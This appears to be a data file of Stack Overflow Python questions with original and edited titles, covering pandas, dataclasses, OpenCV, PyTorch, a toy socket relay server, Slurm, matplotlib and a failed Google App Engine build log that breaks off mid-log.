"Pandas, loc vs non loc when searching for cols with given values"," All the research I do point to using loc as the way to filter a dataframe by a col(s) value(s), today I was reading this and I discovered by the examples I tested, that loc isn't really needed when filtering cols by it's values:EX: Note: I do know that doing loc or iloc return the rows by it's index and the position. I'm not comparing based on this functionality.But when filtering, doing ""where"" clauses what's the difference between using or not using loc? If any. And why do all the examples I come across regarding this subject use loc? <code>  df = pd.DataFrame(np.arange(0, 20, 0.5).reshape(8, 5), columns=['a', 'b', 'c', 'd', 'e']) df.loc[df['a'] >= 15] a b c d e6 15.0 15.5 16.0 16.5 17.07 17.5 18.0 18.5 19.0 19.5df[df['a'] >= 15] a b c d e6 15.0 15.5 16.0 16.5 17.07 17.5 18.0 18.5 19.0 19.5","Pandas, loc vs non loc for boolean indexing"
pandas iteration over rows as dict," I need to iterate over a pandas dataframe in order to pass each row as argument of a function (actually, class constructor) with **kwargs. This means that each row should behave as a dictionary with keys the column names and values the corresponding ones for each row.This works, but it performs very badly: Any suggestions on how to make that more performing ? I have tried iterating with tried df.iterrows(),but I get the following error :TypeError: myfunc() argument after ** must be a mapping, not tupleI have also tried df.itertuples() and df.values , but either I am missing something, or it means that I have to convert each tuple / np.array to a pd.Series or dict , which will also be slow.My constraint is that the script has to work with python 2.7 and pandas 0.14.1. <code>  import pandas as pddef myfunc(**kwargs): try: area = kwargs.get('length', 0)* kwargs.get('width', 0) return area except TypeError: return 'Error : length and width should be int or float'df = pd.DataFrame({'length':[1,2,3], 'width':[10, 20, 30]})for i in range(len(df)): print myfunc(**df.iloc[i])",Iteration over the rows of a Pandas DataFrame as dictionaries
How to check all the installed Python versions on Windows?," Please note I'm not asking ""how to check which version of Python did I install"".I've installed several versions of Pythons on my Windows computer, for example Python 2.7-64, Python 2.7-32, and Python 3.7-32.Python 3 includes ""py"" and ""pyw"" which helps me to easily start different Pythons, for example:""py -2.7"" starts Python 2.7-64""py -2.7-32"" starts Python 2.7-32""py -3.7-32"" starts Python 3.7-32What I'm wondering is, how to check how many different versions of Python did I install on my Windows PC and what versions are they?PyCharm is able to find it but, for one thing, I don't know if it is a complete list, and for another, I wonder if there is any tool provided by Python or the operating system can do it. <code> ",How can I check all the installed Python versions on Windows?
converting a list of tuples to a Series," I have a list of tuples which I want to convert to a Series. I attempt to do this by converting the list to a dictionary and then to a Series: The resulting Series however, doesn't behave as I need it to. It seems to drop key:value pairs (possibly arbitrarily?)E.g. How would I obtain a series without dropping any key value pairs? <code>  return array2[(0, 0.07142857142857142), (0, 0.07142857142857142), (1, 0.08333333333333333), (1, 0.3333333333333333), (1, 0.3333333333333333), (1, 0.08333333333333333), (3, 0.058823529411764705), (3, 0.058823529411764705)] a = pd.Series(dict(array2)) return a 0 0.071429 1 0.083333 3 0.058824",Converting a list of tuples to a Pandas series
"Large dictionary iteration, performance, Python 3: dict[key] vs. dict.items()"," Which of these is faster, and why? Or are they the same? Does the answer vary by any conditions (size of dictionary, type of data, etc.)?Traditional: Hipster: I haven't seen an exact duplicate, but if there is one I'd be happy to be pointed to it. <code>  for key in dict: x = dict[key] x = key for key, value in dict.items(): y = value y = key",Performance in Python 3 dictionary iteration: dict[key] vs. dict.items()
Python dataclasse from dict," The standard library in 3.7 can recursively convert a dataclass into a dict (example from the docs): I am looking for a way to turn a dict back into a dataclass when there is nesting. Something like C(**tmp) only works if the fields of the data class are simple types and not themselves dataclasses. I am familiar with [jsonpickle][1], which however comes with a prominent security warning.EDIT:Answers have suggested the following libraries:dacitemashumaro (I used for a while, works well but I quickly ran into tricky corner cases)pydantic (works very well, excellent documentation and fewer corner cases)[1]: https://jsonpickle.github.io/ <code>  from dataclasses import dataclass, asdictfrom typing import List@dataclassclass Point: x: int y: int@dataclassclass C: mylist: List[Point]p = Point(10, 20)assert asdict(p) == {'x': 10, 'y': 20}c = C([Point(0, 0), Point(10, 4)])tmp = {'mylist': [{'x': 0, 'y': 0}, {'x': 10, 'y': 4}]}assert asdict(c) == tmp",Python dataclass from a nested dict
Python dataclass from dict," The standard library in 3.7 can recursively convert a dataclass into a dict (example from the docs): I am looking for a way to turn a dict back into a dataclass when there is nesting. Something like C(**tmp) only works if the fields of the data class are simple types and not themselves dataclasses. I am familiar with [jsonpickle][1], which however comes with a prominent security warning.EDIT:Answers have suggested the following libraries:dacitemashumaro (I used for a while, works well but I quickly ran into tricky corner cases)pydantic (works very well, excellent documentation and fewer corner cases)[1]: https://jsonpickle.github.io/ <code>  from dataclasses import dataclass, asdictfrom typing import List@dataclassclass Point: x: int y: int@dataclassclass C: mylist: List[Point]p = Point(10, 20)assert asdict(p) == {'x': 10, 'y': 20}c = C([Point(0, 0), Point(10, 4)])tmp = {'mylist': [{'x': 0, 'y': 0}, {'x': 10, 'y': 4}]}assert asdict(c) == tmp",Python dataclass from a nested dict
Background transparent .png format opencv with python," I'm studying on OpenCV with Python. I tried to change a color of picture in PNG format, but I have got some problem with PNG background (The image has transparent background).When I change it to grayscale, the background has changed to black -- my picture is not transparent anymore. What I desire is to keep the transparent background of picture.Original image:My code: Output image:Desired output:The white color around the border image should be transparent. How I can do this? <code>  img = cv2.imread('line.png',cv2.IMREAD_UNCHANGED)cv2.imshow('line',img)cv2.waitKey()",Problem about Background transparent .png format OpenCV with Python
Background transparent .png format OpenCV with Python," I'm studying on OpenCV with Python. I tried to change a color of picture in PNG format, but I have got some problem with PNG background (The image has transparent background).When I change it to grayscale, the background has changed to black -- my picture is not transparent anymore. What I desire is to keep the transparent background of picture.Original image:My code: Output image:Desired output:The white color around the border image should be transparent. How I can do this? <code>  img = cv2.imread('line.png',cv2.IMREAD_UNCHANGED)cv2.imshow('line',img)cv2.waitKey()",Problem about Background transparent .png format OpenCV with Python
How to get all contributions to a GitHub repository?," How can I get the total amount of contributors of a GitHub repository? The API makes it quite difficult because of the pagination.This is what I tried so far using Python: <code>  contributors = ""https://api.github.com/repos/JetBrains/kotlin-web-site/contributors""x = requests.get(contributors)y = json.loads(x.text)len(y) # maximum 30 because of pagination",How to get the total amount of contributors to a GitHub repository?
What are differences for torch tensor vs numpy array?," I have no idea why the result is all 0 with tensor. Anything wrong here? <code>  >>> import torch>>> import numpy as np>>> import math>>> torch.__version__'0.4.1'>>> np.__version__'1.15.4'>>> torch.arange(0, 10, 2) *-(math.log(10000.0) / 10)tensor([0, 0, 0, 0, 0])>>> np.arange(0, 10, 2) *-(math.log(10000.0) / 10)array([-0. , -1.84206807, -3.68413615, -5.52620422, -7.3682723 ])>>> torch.arange(0, 10, 2)tensor([0, 2, 4, 6, 8])>>> np.arange(0, 10, 2)array([0, 2, 4, 6, 8])",PyTorch - multiplying tensor with scalar results in zero vector
torch 0.4.1 produces LongTensor while 0.4.0 FloatTensor," I have no idea why the result is all 0 with tensor. Anything wrong here? <code>  >>> import torch>>> import numpy as np>>> import math>>> torch.__version__'0.4.1'>>> np.__version__'1.15.4'>>> torch.arange(0, 10, 2) *-(math.log(10000.0) / 10)tensor([0, 0, 0, 0, 0])>>> np.arange(0, 10, 2) *-(math.log(10000.0) / 10)array([-0. , -1.84206807, -3.68413615, -5.52620422, -7.3682723 ])>>> torch.arange(0, 10, 2)tensor([0, 2, 4, 6, 8])>>> np.arange(0, 10, 2)array([0, 2, 4, 6, 8])",PyTorch - multiplying tensor with scalar results in zero vector
Make 2 clients connect each other directly if they are in the same local network," I'm writing a toy meeting-point/relay server listening on port 5555 for two clients ""A"" and ""B"". It works like this: every byte received by the server from the firstly-connected client A will be sent to the secondly-connected client B, even if A and B don't know their respective IP: This code is currently working: and you can test it by launching it on a server, and do two netcat connections to it: nc <SERVER_IP> 5555. How can I then pass the information to the clients A and B that they can talk directly to each other without making the bytes transit via the server?There are 2 cases:General case, i.e. even if A and B are not in the same local networkParticular case where these two clients are in the same local network (example: using the same home router), this will be displayed on the server when the 2 clients will connect to the server on port 5555: Remark: a previous unsuccesful attempt here: UDP or TCP hole punching to connect two peers (each one behind a router) and UDP hole punching with a third party <code>  A -----------> server <----------- B # they both connect the server firstA --""hello""--> server # A sends a message to server server --""hello""--> B # the server sends the message to B # server.pyimport socket, timefrom threading import Threadsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)socket.bind(('', 5555))socket.listen(5)buf = ''i = 0def handler(client, i): global buf print 'Hello!', client, i if i == 0: # client A, who sends data to server while True: req = client.recv(1000) buf = str(req).strip() # removes end of line print 'Received from Client A: %s' % buf elif i == 1: # client B, who receives data sent to server by client A while True: if buf != '': client.send(buf) buf = '' time.sleep(0.1)while True: # very simple concurrency: accept new clients and create a Thread for each one client, address = socket.accept() print ""{} connected"".format(address) Thread(target=handler, args=(client, i)).start() i += 1 ('203.0.113.0', 50340) connected # client A, router translated port to 50340('203.0.113.0', 52750) connected # same public IP, client B, router translated port to 52750","How to make 2 clients connect each other directly, after having both connected a meeting-point server?"
How to mask weights in PyTorch weight parameters," I am attempting to mask (force to zero) specific weight values in PyTorch. The weights I am trying to mask are defined as so in the def __init__ The mask is also defined in def __init__ as The mask is a constant and the .requires_grad_() is False for the mask parameter. Now in the def forward part of the class I attempt to do an element-wise multiplication of the weight parameter and the mask before the linear operation is completed I get ann error message: But when I check on the both parameters with .type() both of them come up as torch.cuda.FloatTensor. I am not sure why there is an error here. <code>  class LSTM_MASK(nn.Module): def __init__(self, options, inp_dim): super(LSTM_MASK, self).__init__() .... self.wfx = nn.Linear(input_dim, curernt_output, bias=add_bias) self.mask_use = torch.Tensor(curernt_output, input_dim) def forward(self, x): .... self.wfx.weight = self.wfx.weight * self.mask_use wfx_out = self.wfx(x) self.wfx.weight = self.wfx.weight * self.mask_use File ""/home/xyz/anaconda2/lib/python2.7/site-packages/torch/nn/modules/module.py"", line 537, in __setattr__ .format(torch.typename(value), name))TypeError: cannot assign 'torch.cuda.FloatTensor' as parameter 'weight' (torch.nn.Parameter or None expected)",How to mask weights in PyTorch weight parameters?
how to activate the virtual environnement variable from a sbatch script?," I want to run a script on cluster (SBATCH file).How can activate my virtual environment (path/to/env_name/bin/activate).Does I need only to add the following code to my_script.sh file?module load python/2.7.14source ""/pathto/Python_directory/ENV2.7_new/bin/activate"" <code> ",How to activate a specific Python environment as part of my submission to Slurm?
"Python, how to get rid of white lines in confusion matrix?"," Does anyone know why these white lines are quartering my confusion matrix? I've changed many of the parameters but cannot figure it out. The only thing that makes them go away is if I don't label the blocks at all, ie '0', '1',... but that's obviously not what I want. Any help would be appreciated.Code: Output is: <code>  def plot_confusion_matrix(cm, target_names = ['1', '2', '3', '4'], title = 'Confusion matrix', cmap = None, normalize = False): """""" given a sklearn confusion matrix (cm), make a nice plot Arguments --------- cm: confusion matrix from sklearn.metrics.confusion_matrix target_names: given classification classes such as [0, 1, 2] the class names, for example: ['high', 'medium', 'low'] title: the text to display at the top of the matrix cmap: the gradient of the values displayed from matplotlib.pyplot.cm see http://matplotlib.org/examples/color/colormaps_reference.html plt.get_cmap('jet') or plt.cm.Blues normalize: If False, plot the raw numbers If True, plot the proportions Usage ----- plot_confusion_matrix(cm = cm, # confusion matrix created by # sklearn.metrics.confusion_matrix normalize = True, # show proportions target_names = y_labels_vals, # list of names of the classes title = best_estimator_name) # title of graph Citiation --------- http://scikit-learn.org/stable/auto_examples/model_selection/plot_confusion_matrix.html """""" import matplotlib.pyplot as plt import numpy as np import itertools accuracy = np.trace(cm) / float(np.sum(cm)) misclass = 1 - accuracy if cmap is None: cmap = plt.get_cmap('Blues') plt.figure(figsize = (8, 6)) plt.imshow(cm, interpolation = 'nearest', cmap = cmap) plt.title(title) plt.colorbar() if target_names is not None: tick_marks = np.arange(len(target_names)) plt.xticks(tick_marks, target_names, rotation = 0) plt.yticks(tick_marks, target_names) if normalize: cm = cm.astype('float') / cm.sum(axis = 1)[:, np.newaxis] thresh = cm.max() / 1.5 if normalize else cm.max() / 2 for i, j in itertools.product(range(cm.shape[0]), range(cm.shape[1])): if normalize: plt.text(j, i, ""{:0.4f}"".format(cm[i, j]), horizontalalignment = ""center"", color = ""white"" if cm[i, j] > thresh else ""black"") else: plt.text(j, i, ""{:,}"".format(cm[i, j]), horizontalalignment = ""center"", color = ""white"" if cm[i, j] > thresh else ""black"") plt.tight_layout() plt.ylabel('True label') plt.xlabel('Predicted label\naccuracy={:0.4f}; misclass={:0.4f}'.format(accuracy, misclass)) plt.show()plot_confusion_matrix(cm = (confusion), normalize = True, target_names = ['1', '2', '3', '4'], title = ""Confusion Matrix"")",How to get rid of white lines in confusion matrix?
Google App Engine python37 build error error: `pip_download_wheels` returned code: 1," I am using Django REST Framework to deploy on Google App Engine and my requirements.txt file is as follows: Here is my app.yaml file and my project runs fine on local pip venv: But when I try to deploy it on Google App Engine using the following command I am getting the following error on build time. I am using following article https://cloud.google.com/python/django/appengine Error from Build log: <code>  asn1crypto==0.24.0astroid==2.1.0boto3==1.9.55botocore==1.12.55certifi==2018.8.13cffi==1.11.5chardet==3.0.4colorama==0.4.1coreapi==2.3.3coreschema==0.0.4cryptography==2.4.2defusedxml==0.5.0Django==2.1django-allauth==0.36.0django-filter==2.0.0django-rest-auth==0.9.3django-rest-swagger==2.0.7djangorestframework==3.8.2djangorestframework-jwt==1.11.0docutils==0.14idna==2.7isort==4.3.4itypes==1.1.0Jinja2==2.10jmespath==0.9.3lazy-object-proxy==1.3.1lxml==4.2.5MarkupSafe==1.0mccabe==0.6.1oauthlib==2.1.0openapi-codec==1.3.2Pillow==5.3.0pycparser==2.19PyJWT==1.6.4pylint==2.2.2PyMySQL==0.9.2python-dateutil==2.7.5python-social-auth==0.3.6python3-openid==3.1.0pytz==2018.5requests==2.19.1requests-oauthlib==1.0.0s3transfer==0.1.13simplejson==3.16.0six==1.11.0social-auth-app-django==3.1.0social-auth-core==2.0.0typed-ast==1.1.0uritemplate==3.0.0urllib3==1.23virtualenv==16.0.0wrapt==1.10.11 # [START django_app]runtime: python37handlers:# This configures Google App Engine to serve the files in the app's static# directory.- url: /static static_dir: static/# This handler routes all requests not caught above to your main app. It is# required when static routes are defined, but can be omitted (along with# the entire handlers section) when there are no static files defined.- url: /.* script: auto# [END django_app] gcloud app deploy ERROR: build step 1 ""gcr.io/gae-runtimes/python37_app_builder:python37_3_7_1_20181112_RC01"" failed: exit status 1ERRORFinished Step #1 - ""builder""Step #1 - ""builder"": error: `pip_download_wheels` returned code: 2Step #1 - ""builder"": Step #1 - ""builder"": ValueError: embedded null byteStep #1 - ""builder"": st = os.stat(s)Step #1 - ""builder"": File ""/env/lib/python3.7/genericpath.py"", line 42, in isdirStep #1 - ""builder"": looks_like_dir = os.path.isdir(p) and (Step #1 - ""builder"": File ""/env/lib/python3.7/site-packages/pip/_internal/req/constructors.py"", line 207, in install_req_from_lineStep #1 - ""builder"": isolated=isolated, options=req_options, wheel_cache=wheel_cacheStep #1 - ""builder"": File ""/env/lib/python3.7/site-packages/pip/_internal/req/req_file.py"", line 158, in process_lineStep #1 - ""builder"": for req in req_iter:Step #1 - ""builder"": File ""/env/lib/python3.7/site-packages/pip/_internal/req/req_file.py"", line 91, in parse_requirementsStep #1 - ""builder"": wheel_cache=wheel_cache):Step #1 - ""builder"": File ""/env/lib/python3.7/site-packages/pip/_internal/cli/base_command.py"", line 235, in populate_requirement_setStep #1 - ""builder"": self.name, wheel_cacheStep #1 - ""builder"": File ""/env/lib/python3.7/site-packages/pip/_internal/commands/wheel.py"", line 135, in runStep #1 - ""builder"": status = self.run(options, args)Step #1 - ""builder"": File ""/env/lib/python3.7/site-packages/pip/_internal/cli/base_command.py"", line 143, in mainStep #1 - ""builder"": Traceback (most recent call last):Step #1 - ""builder"": Exception:Step #1 - ""builder"": ERROR `pip_download_wheels` had stderr output:Step #1 - ""builder"": INFO full build took 5 secondsStep #1 - ""builder"": INFO build process for FTL image took 5 secondsStep #1 - ""builder"": INFO pip_download_wheels took 0 secondsStep #1 - ""builder"": ERROR error: `pip_download_wheels` returned code: 2Step #1 - ""builder"": Step #1 - ""builder"": ValueError: embedded null byteStep #1 - ""builder"": st = os.stat(s)Step #1 - ""builder"": File ""/env/lib/python3.7/genericpath.py"", line 42, in isdirStep #1 - ""builder"": looks_like_dir = os.path.isdir(p) and (Step #1 - ""builder"": File ""/env/lib/python3.7/site-packages/pip/_internal/req/constructors.py"", line 207, in install_req_from_lineStep #1 - ""builder"": isolated=isolated, options=req_options, wheel_cache=wheel_cacheStep #1 - ""builder"": File ""/env/lib/python3.7/site-packages/pip/_internal/req/req_file.py"", line 158, in process_lineStep #1 - ""builder"": for req in req_iter:Step #1 - ""builder"": File ""/env/lib/python3.7/site-packages/pip/_internal/req/req_file.py"", line 91, in parse_requirementsStep #1 - ""builder"": wheel_cache=wheel_cache):Step #1 - ""builder"": File ""/env/lib/python3.7/site-packages/pip/_internal/cli/base_command.py"", line 235, in populate_requirement_setStep #1 - ""builder"": self.name, wheel_cacheStep #1 - ""builder"": File ""/env/lib/python3.7/site-packages/pip/_internal/commands/wheel.py"", line 135, in runStep #1 - ""builder"": status = self.run(options, args)Step #1 - ""builder"": File ""/env/lib/python3.7/site-packages/pip/_internal/cli/base_command.py"", line 143, in mainStep #1 - ""builder"": Traceback (most recent call last):Step #1 - ""builder"": Exception:Step #1 - ""builder"": INFO `pip_download_wheels` had stderr output:Step #1 - ""builder"": Step #1 - ""builder"": INFO `pip_download_wheels` stdout:Step #1 - ""builder"": INFO pip_download_wheels /env/bin/python3.7 -m pip wheel -w /tmp/tmp_5Kp_T/wheel -r requirements.txt --disable-pip-version-checkStep #1 - ""builder"": INFO starting: pip_download_wheelsStep #1 - ""builder"": Step #1 - ""builder"": gunicornStep #1 - ""builder"": Step #1 - ""builder"": wrapt==1.10.11Step #1 - ""builder"": virtualenv==16.0.0Step #1 - ""builder"": urllib3==1.23Step #1 - ""builder"": uritemplate==3.0.0Step #1 - ""builder"": typed-ast==1.1.0Step #1 - ""builder"": social-auth-core==2.0.0Step #1 - ""builder"": social-auth-app-django==3.1.0Step #1 - ""builder"": six==1.11.0Step #1 - ""builder"": simplejson==3.16.0Step #1 - ""builder"": s3transfer==0.1.13Step #1 - ""builder"": requests-oauthlib==1.0.0Step #1 - ""builder"": requests==2.19.1Step #1 - ""builder"": pytz==2018.5Step #1 - ""builder"": python3-openid==3.1.0Step #1 - ""builder"": python-social-auth==0.3.6Step #1 - ""builder"": python-dateutil==2.7.5Step #1 - ""builder"": PyMySQL==0.9.2Step #1 - ""builder"": pylint==2.2.2Step #1 - ""builder"": PyJWT==1.6.4Step #1 - ""builder"": pycparser==2.19Step #1 - ""builder"": Pillow==5.3.0Step #1 - ""builder"": openapi-codec==1.3.2Step #1 - ""builder"": oauthlib==2.1.0Step #1 - ""builder"": mccabe==0.6.1Step #1 - ""builder"": MarkupSafe==1.0Step #1 - ""builder"": lxml==4.2.5Step #1 - ""builder"": lazy-object-proxy==1.3.1Step #1 - ""builder"": jmespath==0.9.3Step #1 - ""builder"": Jinja2==2.10Step #1 - ""builder"": itypes==1.1.0Step #1 - ""builder"": isort==4.3.4Step #1 - ""builder"": idna==2.7Step #1 - ""builder"": docutils==0.14Step #1 - ""builder"": djangorestframework-jwt==1.11.0Step #1 - ""builder"": djangorestframework==3.8.2Step #1 - ""builder"": django-rest-swagger==2.0.7Step #1 - ""builder"": django-rest-auth==0.9.3Step #1 - ""builder"": django-filter==2.0.0Step #1 - ""builder"": django-allauth==0.36.0Step #1 - ""builder"": Django==2.1Step #1 - ""builder"": defusedxml==0.5.0Step #1 - ""builder"": cryptography==2.4.2Step #1 - ""builder"": coreschema==0.0.4Step #1 - ""builder"": colorama==0.4.1Step #1 - ""builder"": chardet==3.0.4Step #1 - ""builder"": cffi==1.11.5Step #1 - ""builder"": certifi==2018.8.13Step #1 - ""builder"": botocore==1.12.55Step #1 - ""builder"": boto3==1.9.55Step #1 - ""builder"": astroid==2.1.0Step #1 - ""builder"": INFO new_descriptor_contents: Step #1 - ""builder"": Step #1 - ""builder"": gunicornStep #1 - ""builder"": Step #1 - ""builder"": wrapt==1.10.11Step #1 - ""builder"": virtualenv==16.0.0Step #1 - ""builder"": urllib3==1.23Step #1 - ""builder"": uritemplate==3.0.0Step #1 - ""builder"": typed-ast==1.1.0Step #1 - ""builder"": social-auth-core==2.0.0Step #1 - ""builder"": social-auth-app-django==3.1.0Step #1 - ""builder"": six==1.11.0Step #1 - ""builder"": simplejson==3.16.0Step #1 - ""builder"": s3transfer==0.1.13Step #1 - ""builder"": requests-oauthlib==1.0.0Step #1 - ""builder"": requests==2.19.1Step #1 - ""builder"": pytz==2018.5Step #1 - ""builder"": python3-openid==3.1.0Step #1 - ""builder"": python-social-auth==0.3.6Step #1 - ""builder"": python-dateutil==2.7.5Step #1 - ""builder"": PyMySQL==0.9.2Step #1 - ""builder"": pylint==2.2.2Step #1 - ""builder"": PyJWT==1.6.4Step #1 - ""builder"": pycparser==2.19Step #1 - ""builder"": Pillow==5.3.0Step #1 - ""builder"": openapi-codec==1.3.2Step #1 - ""builder"": oauthlib==2.1.0Step #1 - ""builder"": mccabe==0.6.1Step #1 - ""builder"": MarkupSafe==1.0Step #1 - ""builder"": lxml==4.2.5Step #1 - ""builder"": lazy-object-proxy==1.3.1Step #1 - ""builder"": jmespath==0.9.3Step #1 - ""builder"": Jinja2==2.10Step #1 - ""builder"": itypes==1.1.0Step #1 - ""builder"": isort==4.3.4Step #1 - ""builder"": idna==2.7Step #1 - ""builder"": docutils==0.14Step #1 - ""builder"": djangorestframework-jwt==1.11.0Step #1 - ""builder"": djangorestframework==3.8.2Step #1 - ""builder"": django-rest-swagger==2.0.7Step #1 - ""builder"": django-rest-auth==0.9.3Step #1 - ""builder"": django-filter==2.0.0Step #1 - ""builder"": django-allauth==0.36.0Step #1 - ""builder"": Django==2.1Step #1 - ""builder"": defusedxml==0.5.0Step #1 - ""builder"": cryptography==2.4.2Step #1 - ""builder"": coreschema==0.0.4Step #1 - ""builder"": colorama==0.4.1Step #1 - ""builder"": chardet==3.0.4Step #1 - ""builder"": cffi==1.11.5Step #1 - ""builder"": certifi==2018.8.13Step #1 - ""builder"": botocore==1.12.55Step #1 - ""builder"": boto3==1.9.55Step #1 - ""builder"": astroid==2.1.0Step #1 - ""builder"": INFO descriptor_contents:Step #1 - ""builder"": INFO create_virtualenv took 3 secondsStep #1 - ""builder"": Step #1 - ""builder"": done.Step #1 - ""builder"": Installing setuptools, pip, wheel...Step #1 - ""builder"": Also creating executable in /env/bin/pythonStep #1 - ""builder"": New python executable in /env/bin/python3.7Step #1 - ""builder"": Using base prefix '/opt/python3.7'Step #1 - ""builder"": Already using interpreter /opt/python3.7/bin/python3.7Step #1 - ""builder"": INFO `create_virtualenv` stdout:Step #1 - ""builder"": INFO create_virtualenv /opt/python3.7/bin/python3.7 -m virtualenv --no-download /env -p /opt/python3.7/bin/python3.7Step #1 - ""builder"": INFO starting: create_virtualenvStep #1 - ""builder"": INFO checking_cached_requirements.txt_layer took 0 secondsStep #1 - ""builder"": INFO [CACHE][MISS] v0.10.0:PYTHON (requirements)->db6d697e2acda217ea25588a91a62aac86c485af407cd96d55456ad6724c2b02Step #1 - ""builder"": INFO check python version took 0 secondsStep #1 - ""builder"": Step #1 - ""builder"": INFO `python version` stderr:Step #1 - ""builder"": /opt/python3.7/bin/python3.7 --versionStep #1 - ""builder"": INFO `python version` full cmd:Step #1 - ""builder"": INFO starting: check python versionStep #1 - ""builder"": Step #1 - ""builder"": gunicornStep #1 - ""builder"": Step #1 - ""builder"": wrapt==1.10.11Step #1 - ""builder"": virtualenv==16.0.0Step #1 - ""builder"": urllib3==1.23Step #1 - ""builder"": uritemplate==3.0.0Step #1 - ""builder"": typed-ast==1.1.0Step #1 - ""builder"": social-auth-core==2.0.0Step #1 - ""builder"": social-auth-app-django==3.1.0Step #1 - ""builder"": six==1.11.0Step #1 - ""builder"": simplejson==3.16.0Step #1 - ""builder"": s3transfer==0.1.13Step #1 - ""builder"": requests-oauthlib==1.0.0Step #1 - ""builder"": requests==2.19.1Step #1 - ""builder"": pytz==2018.5Step #1 - ""builder"": python3-openid==3.1.0Step #1 - ""builder"": python-social-auth==0.3.6Step #1 - ""builder"": python-dateutil==2.7.5Step #1 - ""builder"": PyMySQL==0.9.2Step #1 - ""builder"": pylint==2.2.2Step #1 - ""builder"": PyJWT==1.6.4Step #1 - ""builder"": pycparser==2.19Step #1 - ""builder"": Pillow==5.3.0Step #1 - ""builder"": openapi-codec==1.3.2Step #1 - ""builder"": oauthlib==2.1.0Step #1 - ""builder"": mccabe==0.6.1Step #1 - ""builder"": MarkupSafe==1.0Step #1 - ""builder"": lxml==4.2.5Step #1 - ""builder"": lazy-object-proxy==1.3.1Step #1 - ""builder"": jmespath==0.9.3Step #1 - ""builder"": Jinja2==2.10Step #1 - ""builder"": itypes==1.1.0Step #1 - ""builder"": isort==4.3.4Step #1 - ""builder"": idna==2.7Step #1 - ""builder"": docutils==0.14Step #1 - ""builder"": djangorestframework-jwt==1.11.0Step #1 - ""builder"": djangorestframework==3.8.2Step #1 - ""builder"": django-rest-swagger==2.0.7Step #1 - ""builder"": django-rest-auth==0.9.3Step #1 - ""builder"": django-filter==2.0.0Step #1 - ""builder"": django-allauth==0.36.0Step #1 - ""builder"": Django==2.1Step #1 - ""builder"": defusedxml==0.5.0Step #1 - ""builder"": cryptography==2.4.2Step #1 - ""builder"": coreschema==0.0.4Step #1 - ""builder"": colorama==0.4.1Step #1 - ""builder"": chardet==3.0.4Step #1 - ""builder"": cffi==1.11.5Step #1 - ""builder"": certifi==2018.8.13Step #1 - ""builder"": botocore==1.12.55Step #1 - ""builder"": boto3==1.9.55Step #1 - ""builder"": astroid==2.1.0Step #1 - ""builder"": INFO new_descriptor_contents: Step #1 - ""builder"": Step #1 - ""builder"": gunicornStep #1 - ""builder"": Step #1 - ""builder"": wrapt==1.10.11Step #1 - ""builder"": virtualenv==16.0.0Step #1 - ""builder"": urllib3==1.23Step #1 - ""builder"": uritemplate==3.0.0Step #1 - ""builder"": typed-ast==1.1.0Step #1 - ""builder"": social-auth-core==2.0.0Step #1 - ""builder"": social-auth-app-django==3.1.0Step #1 - ""builder"": six==1.11.0Step #1 - ""builder"": simplejson==3.16.0Step #1 - ""builder"": s3transfer==0.1.13Step #1 - ""builder"": requests-oauthlib==1.0.0Step #1 - ""builder"": requests==2.19.1Step #1 - ""builder"": pytz==2018.5Step #1 - ""builder"": python3-openid==3.1.0Step #1 - ""builder"": python-social-auth==0.3.6Step #1 - ""builder"": python-dateutil==2.7.5Step #1 - ""builder"": PyMySQL==0.9.2Step #1 - ""builder"": pylint==2.2.2Step #1 - ""builder"": PyJWT==1.6.4Step #1 - ""builder"": pycparser==2.19Step #1 - ""builder"": Pillow==5.3.0Step #1 - ""builder"": openapi-codec==1.3.2Step #1 - ""builder"": oauthlib==2.1.0Step #1 - ""builder"": mccabe==0.6.1Step #1 - ""builder"": MarkupSafe==1.0Step #1 - ""builder"": lxml==4.2.5Step #1 - ""builder"": lazy-object-proxy==1.3.1Step #1 - ""builder"": jmespath==0.9.3Step #1 - ""builder"": Jinja2==2.10Step #1 - ""builder"": itypes==1.1.0Step #1 - ""builder"": isort==4.3.4Step #1 - ""builder"": idna==2.7Step #1 - ""builder"": docutils==0.14Step #1 - ""builder"": djangorestframework-jwt==1.11.0Step #1 - ""builder"": djangorestframework==3.8.2Step #1 - ""builder"": django-rest-swagger==2.0.7Step #1 - ""builder"": django-rest-auth==0.9.3Step #1 - ""builder"": django-filter==2.0.0Step #1 - ""builder"": django-allauth==0.36.0Step #1 - ""builder"": Django==2.1Step #1 - ""builder"": defusedxml==0.5.0Step #1 - ""builder"": cryptography==2.4.2Step #1 - ""builder"": coreschema==0.0.4Step #1 - ""builder"": colorama==0.4.1Step #1 - ""builder"": chardet==3.0.4Step #1 - ""builder"": cffi==1.11.5Step #1 - ""builder"": certifi==2018.8.13Step #1 - ""builder"": botocore==1.12.55Step #1 - ""builder"": boto3==1.9.55Step #1 - ""builder"": astroid==2.1.0Step #1 - ""builder"": INFO descriptor_contents:Step #1 - ""builder"": INFO No cached dependency layer for db6d697e2acda217ea25588a91a62aac86c485af407cd96d55456ad6724c2b02Step #1 - ""builder"": INFO Cache miss on local cache for asia.gcr.io/e2isapjango/app-engine-tmp/build-cache/ttl-7d/python-cache:db6d697e2acda217ea25588a91a62aac86c485af407cd96d55456ad6724c2b02Step #1 - ""builder"": INFO No cached base image found for entry: asia.gcr.io/e2isapjango/app-engine-tmp/build-cache/ttl-7d/python-cache:db6d697e2acda217ea25588a91a62aac86c485af407cd96d55456ad6724c2b02.Step #1 - ""builder"": DEBUG Checking cache for cache_key db6d697e2acda217ea25588a91a62aac86c485af407cd96d55456ad6724c2b02Step #1 - ""builder"": INFO check python version took 0 secondsStep #1 - ""builder"": Step #1 - ""builder"": INFO `python version` stderr:Step #1 - ""builder"": /opt/python3.7/bin/python3.7 --versionStep #1 - ""builder"": INFO `python version` full cmd:Step #1 - ""builder"": INFO starting: check python versionStep #1 - ""builder"": Step #1 - ""builder"": gunicornStep #1 - ""builder"": Step #1 - ""builder"": wrapt==1.10.11Step #1 - ""builder"": virtualenv==16.0.0Step #1 - ""builder"": urllib3==1.23Step #1 - ""builder"": uritemplate==3.0.0Step #1 - ""builder"": typed-ast==1.1.0Step #1 - ""builder"": social-auth-core==2.0.0Step #1 - ""builder"": social-auth-app-django==3.1.0Step #1 - ""builder"": six==1.11.0Step #1 - ""builder"": simplejson==3.16.0Step #1 - ""builder"": s3transfer==0.1.13Step #1 - ""builder"": requests-oauthlib==1.0.0Step #1 - ""builder"": requests==2.19.1Step #1 - ""builder"": pytz==2018.5Step #1 - ""builder"": python3-openid==3.1.0Step #1 - ""builder"": python-social-auth==0.3.6Step #1 - ""builder"": python-dateutil==2.7.5Step #1 - 